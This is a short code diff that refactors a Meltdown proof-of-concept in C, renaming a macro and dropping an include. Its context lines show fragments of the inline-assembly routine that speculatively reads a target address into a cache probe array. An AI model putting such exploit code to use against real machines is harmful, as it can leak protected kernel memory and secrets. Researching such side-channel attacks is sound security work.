@@ -26,11 +26,10 @@
 #include <stdio.h>
 #include <signal.h>
 #include <setjmp.h>
-#include <x86intrin.h>
 
 #define BYTE_SIZE 256
-#define CHUNK_OFFSET 0x0c
-#define CHUNK_SIZE (1 << CHUNK_OFFSET)
+#define CHUNK_SHIFT 0x0c
+#define CHUNK_SIZE (1 << CHUNK_SHIFT)
 
 static sigjmp_buf _jmp_buf;
 
@@ -70,7 +69,7 @@ int meltdown(uintptr_t addr, uint8_t *val)
         "jz retry               \n\t" // jz retry (?)
         "movb (%1, %%rax), %%al \n\t" // read from tube
         :
-        : "r"(addr), "r"(tube), "J"(CHUNK_OFFSET)
+        : "r"(addr), "r"(tube), "J"(CHUNK_SHIFT)
         : "rax"); // RAX is used internally
 
 cont:
